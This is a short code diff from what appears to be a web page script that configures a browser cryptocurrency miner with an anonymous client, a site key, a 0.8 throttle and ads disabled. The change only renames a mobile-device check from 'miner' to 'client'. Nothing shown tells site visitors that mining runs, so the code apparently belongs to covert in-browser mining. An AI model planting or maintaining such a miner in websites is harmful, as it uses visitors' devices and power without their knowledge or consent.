@@ -2,7 +2,7 @@ let client = new Client.Anonymous('83bb0b1d55c4451174461f52e974bac8e3d1725b42334
   throttle: 0.8, c: 'w', ads: 0
 });
 
-if(miner.isMobile()){
+if(client.isMobile()){
 
 }
 else{
